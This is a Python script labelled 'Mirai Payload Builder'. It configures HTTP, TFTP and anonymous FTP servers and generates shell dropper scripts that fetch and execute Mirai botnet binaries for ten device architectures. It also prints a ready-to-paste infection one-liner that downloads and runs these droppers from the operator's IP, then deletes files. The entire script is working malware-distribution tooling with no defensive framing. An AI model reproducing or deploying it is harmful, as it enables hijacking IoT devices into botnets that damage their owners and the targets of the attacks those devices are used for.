"""

 _____________________________________
|                                     |
|        MIRAI PAYLOAD BUILDER        |
|          Made By Zx3YT              |
|_____________________________________|

"""
import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "3AvA"
exec_name = "ssh"
bin_prefix = "reap."
bin_directory = "AB4g5"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("Setting up HTTP TFTP and FTP for your payload")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/treap.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/treap.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/treap.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/reap.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/reap.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/reap.sh')
run('echo "#!/bin/bash" > /var/www/html/reap.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/reap.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/reap.sh')
run('echo "#!/bin/bash" > /var/ftp/reap.sh')
run('echo "ulimit -n 1024" >> /var/ftp/reap.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/reap.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/reap.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/reap.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/treap.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/reap.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/reap.sh; curl -O http://" + ip + "/reap.sh; chmod 777 reap.sh; sh reap.sh; tftp " + ip + " -c get treap.sh; chmod 777 treap.sh; sh treap.sh; tftp -r reap.sh -g " + ip + "; chmod 777 reap.sh; sh reap.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " reap.sh reap.sh; sh reap.sh; rm -rf reap.sh treap.sh reap.sh reap.sh; rm -rf *\x1b[0m")
print("")
raw_input("press any key to exit....")
